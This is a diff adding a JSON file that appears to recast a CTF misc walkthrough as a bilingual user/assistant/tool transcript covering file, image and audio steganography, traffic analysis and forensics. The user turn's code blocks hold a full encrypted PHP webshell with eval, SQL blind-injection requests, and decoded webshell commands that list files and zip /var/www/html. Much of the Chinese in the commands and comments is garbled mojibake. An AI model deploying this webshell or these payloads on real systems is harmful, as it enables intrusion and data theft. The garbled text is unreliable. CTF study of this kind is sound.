@@ -1,0 +1,215 @@
+{
+    "_source_md":  "CTF/2021-07-29-CTF-Misc-WalkThrough.md",
+    "version":  "ctf-misc-walkthrough",
+    "title":  {
+                  "zh":  "CTF杂项题目详解",
+                  "en":  "CTF Misc Challenges Walkthrough"
+              },
+    "description":  {
+                        "zh":  "CTF杂项方向题目的详细解题指南，包括文件隐写、图片隐写、音频隐写、流量分析、取证分析等。",
+                        "en":  "Detailed guide for CTF misc challenges, covering file steganography, image steganography, audio steganography, traffic analysis, forensics analysis, etc."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析CTF杂项题目的常见类型和解题技巧",
+                                      "en":  "Analyze common types and solving techniques of CTF misc challenges"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求杂项题目分析",
+                                         "en":  "User requests misc challenge analysis"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?binwalk word鐨勬湰璐ㄧ殑闄勪欢.docx\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             Zip archive data, at least v1.0 to extract, name: _rels/\n路路路\n8139          0x1FCB          Zip archive data, at least v1.0 to extract, compressed size: 31149, uncompressed size: 31149, name: word/media/image1.jpg\n39339         0x99AB          Zip archive data, at least v1.0 to extract, compressed size: 19960, uncompressed size: 19960, name: word/media/image2.png\n路路路\n105465        0x19BF9         End of Zip archive, footer length: 22",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃? binwalk 绠€鍗曠殑鍥剧墖鐨勯檮浠?zip\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 1214015, uncompressed size: 1226323, name: 2.png\n1214050       0x128662        Zip archive data, at least v2.0 to extract, compressed size: 1008239, uncompressed size: 1008124, name: 1.png\n2222498       0x21E9A2        End of Zip archive, footer length: 22",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?binwalk 1.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced\n179           0xB3            Zlib compressed data, best compression\n310064        0x4BB30         MySQL MISAM compressed data file Version 11\n\n鉃?binwalk 2.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃?ll\ntotal 9880\ndrwxr-xr-x  6 bin4xin  staff      192  8 19 10:01 ./\ndrwx------  8 bin4xin  staff      256  8 19 09:49 ../\n-rw-r--r--  1 bin4xin  staff  1008124  8 19 09:49 0\n-rw-r--r--@ 1 bin4xin  staff   698060  8 19 09:49 4BB30\n-rw-r--r--  1 bin4xin  staff  2333520  8 19 09:49 B3\n-rw-r--r--  1 bin4xin  staff  1007945  8 19 09:49 B3.zlib\n\n鉃?file 4BB30\n4BB30: MySQL MyISAM index file Version 11, 50404 key parts, 19163 unique key parts, 111 keys, 1846990095656532900 records, 1063746735895758743 deleted records",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ python bwm.py decode 2.png 1.png Result-1.png\n$ python bwm.py decode 1.png 2.png Result-2.png",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "GET /ctf/Less-5/?id=1\u0027 and ascii(substr((select flag from t),1,1))=102--  HTTP/1.1\nGET /ctf/Less-5/?id=1\u0027 and ascii(substr((select flag from t),2,1))=108--  HTTP/1.1\nGET /ctf/Less-5/?id=1\u0027 and ascii(substr((select flag from t),3,1))=97--  HTTP/1.1\nGET /ctf/Less-5/?id=1\u0027 and ascii(substr((select flag from t),4,1))=103--  HTTP/1.1\n路路路",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125\n\n#-\u003e flag{w1reshARK_ez_1snt}",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "POST /login.php HTTP/1.1\n路路路\nusername=admin\u0026password=mysql\u0026button=SIGN-IN\nHTTP/1.1 302 Found\nLocation: ./admin/index.php",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?php\n    session_start();\n    @set_time_limit(0);\n\t@error_reporting(0);\n    function E($D,$K){\n        for($i=0;$i\u003cstrlen($D);$i++) {\n            $D[$i] = $D[$i]^$K[$i+1\u002615];\n        }# E鍑芥暟涓哄紓鎴栧姞瀵?        return $D;\n    }\n    function Q($D){\n        return base64_encode($D);\n    }# Q鍑芥暟涓篵ase64缂栫爜\n    function O($D){\n        return base64_decode($D);\n    }# O鍑芥暟涓篵ase64瑙ｇ爜\n    $P=\u0027pass\u0027; # 鏈ㄩ┈杩炴帴鍙傛暟\n    $V=\u0027payload\u0027; # 鎵ц杞借嵎\n    $T=\u00273c6e0b8a9c15224a\u0027; # 鍔犲瘑瀵嗛挜\n    if (isset($_POST[$P])){\n        $F=O(E(O($_POST[$P]),$T));\n        if (isset($_SESSION[$V])){\n            $L=$_SESSION[$V];\n            $A=explode(\u0027|\u0027,$L);\n            class C{public function nvoke($p) {eval($p.\"\");}}\n            $R=new C();\n\t\t\t$R-\u003envoke($A[0]);\n            echo substr(md5($P.$T),0,16);\n            echo Q(E(@run($F),$T));\n            echo substr(md5($P.$T),16);\n        }else{\n            $_SESSION[$V]=$F;\n        }\n    }\n#/upload/1615384904.php 涓婁紶鎴愬姛锛屼负1615384904.php",
+                                             "language":  "php"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#cmdLine=bHMK\u0026methodName=ZXhlY0NvbW1hbmQ= -\u003e base64decode -\u003ecmdLine=ls\u0026methodName=execCommand\n1532851276json       1532851294.php       1532851316.php       1615384904.php",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "cmdLine=zip www.zip -rP $APACHE_RUN_USER /var/www/html/\u0026methodName=execCommand",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?php\n$enc = \u0027aes-128-ecb\u0027;\n$flag = \u0027CN1Sq9tFItxZhsu3zCWbrdf6ozOL4eoKG0s71vGg/AKKnch3IL3jzwtXeCgWK5QP\u0027;\n?\u003e",
+                                             "language":  "php"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "杂项题目范围广泛，包括文件隐写、流量分析、取证分析等。需要掌握各类文件格式和常用工具。",
+                                      "en":  "Misc challenges cover wide range including file steganography, traffic analysis, forensics. Need to master various file formats and common tools."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手介绍杂项题型",
+                                         "en":  "Assistant introduces misc challenge types"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "binwalk",
+                      "content":  {
+                                      "zh":  "文件隐写：识别docx文件实际为zip格式，解压后在media目录发现隐藏flag图片",
+                                      "en":  "File steganography: Identify docx file is actually zip format, find hidden flag image in media directory after extraction"
+                                  },
+                      "annotation":  {
+                                         "zh":  "文件格式识别示例",
+                                         "en":  "File format identification example"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "文件格式识别是杂项基础。通过文件头(魔术字节)判断真实格式，常用binwalk、file命令分析。",
+                                      "en":  "File format identification is misc foundation. Judge real format via file headers (magic bytes), commonly use binwalk, file command for analysis."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手讲解文件格式分析",
+                                         "en":  "Assistant explains file format analysis"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "python",
+                      "content":  {
+                                      "zh":  "盲水印题目：两张相同图片通过BlindWaterMark工具提取隐藏水印信息",
+                                      "en":  "Blind watermark challenge: Two identical images extract hidden watermark information via BlindWaterMark tool"
+                                  },
+                      "annotation":  {
+                                         "zh":  "盲水印隐写示例",
+                                         "en":  "Blind watermark steganography example"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "图片隐写常见技术：LSB隐写、EXIF信息、盲水印。遇到相似图片优先考虑盲水印。",
+                                      "en":  "Common image steganography techniques: LSB steganography, EXIF info, blind watermark. Consider blind watermark first for similar images."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手讲解图片隐写技术",
+                                         "en":  "Assistant explains image steganography techniques"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "wireshark",
+                      "content":  {
+                                      "zh":  "流量分析：SQL注入流量包通过二分法盲注特征提取flag，分析HTTP返回差异",
+                                      "en":  "Traffic analysis: SQL injection traffic packet extracts flag via binary blind injection characteristics, analyze HTTP response differences"
+                                  },
+                      "annotation":  {
+                                         "zh":  "流量分析示例",
+                                         "en":  "Traffic analysis example"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "audacity",
+                      "content":  {
+                                      "zh":  "音频隐写：通过Audacity调整播放速度，解码摩尔斯电码获取flag",
+                                      "en":  "Audio steganography: Adjust playback speed via Audacity, decode Morse code to get flag"
+                                  },
+                      "annotation":  {
+                                         "zh":  "音频隐写示例",
+                                         "en":  "Audio steganography example"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "杂项题目需要广泛的知识储备和工具使用经验，遇到未知情况多尝试不同工具和方法。",
+                                      "en":  "Misc challenges require broad knowledge reserve and tool usage experience, try different tools and methods for unknown situations."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手总结杂项解题要点",
+                                         "en":  "Assistant summarizes misc solving points"
+                                     }
+                  }
+              ]
+}
